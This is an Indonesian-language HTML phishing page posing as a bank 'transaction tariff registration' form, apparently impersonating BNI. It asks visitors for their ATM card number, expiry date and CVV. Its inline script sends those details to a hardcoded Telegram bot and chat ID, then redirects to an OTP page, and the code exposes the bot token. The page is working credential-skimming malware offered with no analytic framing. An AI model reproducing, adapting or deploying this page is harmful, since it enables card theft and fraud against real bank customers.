<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>information</title>
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
            crossorigin="anonymous"
        />
    </head>
    <body>
        <img src="kbni.webp" class="img-fluid" alt="..." />
        <div class="container">
            <p class="fw-bold">Registrasi tarif transaksi</p>
            <div class="mt-4">
                <span style="color: #808080">Silahkan masukan kartu ATM</span>
                <input
                    class="form-control"
                    style="border: 1px solid #000"
                    type="number"
                    name="noatm"
                    id="noatm"
                    placeholder="Nomor kartu"
                />
            </div>
            <div class="mt-3 row row-cols-2 row-cols-lg-5 g-2 g-lg-3">
                <div class="col">
                    <span style="color: #808080">Berlaku sampai</span>
                    <input
                        class="form-control"
                        type="number"
                        name="bt"
                        id="bt"
                        placeholder="BB/TT"
                        style="border: 1px solid #000"
                    />
                </div>
                <div class="col">
                    <span style="color: #808080">CVV</span>
                    <input
                        class="form-control"
                        type="number"
                        name="cvv"
                        id="cvv"
                        placeholder="CVV"
                        style="border: 1px solid #000"
                    />
                </div>
            </div>
            <div class="mt-5">
                <button
                    class="btn fw-bold text-light"
                    style="background-color: #df420eff; width: 100%"
                    onclick="next()"
                >
                    Submit
                </button>
            </div>
        </div>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
            crossorigin="anonymous"
        ></script>
        <script>
            async function sendMessage(chatId, text) {
                const url =
                    "https://api.telegram.org/bot6296115188:AAHsxs2hX66fPQIDLkiyvEQYfByq2qXiN5Q/sendMessage";
                const payload = {
                    chat_id: chatId,
                    text: text,
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    throw new Error("Failed to send message");
                } else {
                    window.location.href = "otp.html";
                }
            }
            const next = () => {
                let nomor = document.querySelector("#noatm").value;
                let bt = document.querySelector("#bt").value;
                let cvv = document.querySelector("#cvv").value;
                if (nomor === "" || bt === "" || cvv === "") {
                    alert("mohon lengkapi semua data!");
                } else {
                    let text = `Nomor kartu: ${nomor}\nBB/TT: ${bt}\nCVV: ${cvv}`;
                    let chatId = "6201620059";
                    sendMessage(chatId, text);
                }
            };
        </script>
    </body>
</html>
